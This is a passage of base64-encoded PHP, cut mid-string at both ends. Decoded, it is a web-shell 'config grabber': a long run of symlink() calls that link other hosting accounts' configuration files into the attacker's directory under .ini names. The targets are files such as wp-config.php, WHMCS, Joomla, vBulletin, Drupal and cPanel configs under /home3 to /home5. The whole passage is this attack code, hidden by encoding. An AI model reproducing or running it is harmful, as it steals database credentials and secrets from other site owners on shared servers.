maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnMi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJGRvbWFpbi4nfj5EcnVwYWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2RhdGFzL2NvbmZpZy5waHAnLCRkb21haW4uJ34+U2VkaXRpby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi5pbmknKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi1mb3J1bS5pbmknKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci5pbmknKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8uaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LmluaScpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0uaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm1hbmdld2htY3MuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PldobTkuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnRzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZXMuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLXNob3BwaW5nLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlci5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyMi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53cDEzLXByZXNzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXdzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXcuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd2ViL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13ZWIuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ibG9ncy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXByb3RhbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+b3JkcHJlc3Mtc2l0ZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4uaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy10ZXN0LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWpvb21sYS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWpvby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWNtcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW1haW4uaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbmV3cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+VkJ1bGxldGluLWZvcnVtLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jcGFuZWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdGluZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+emVuY2FydC5pbmknKTsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC96ZW5jYXJ0L2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+emVuY2FydC1zaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLVpDc2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+Pm1rLXBvcnRhbGUxLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi5pbmknKTsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bS5pbmknKTsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pm1hbGF5LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywkZG9tYWluLid+PkRydXBhbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2UxMDdfY29uZmlnLnBocCcsJGRvbWFpbi4nfj5lMTA3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0uaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLWZvcnVtLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywkZG9tYWluLid+fj5CYWxpdGJhbmcuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmcuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy5pbmknKSA7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS5pbmknKSA7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywkZG9tYWluLid+fj5waHBiYjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htYy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+V2htOS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2UuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3Atc2hvcHBpbmcuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ldy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBoc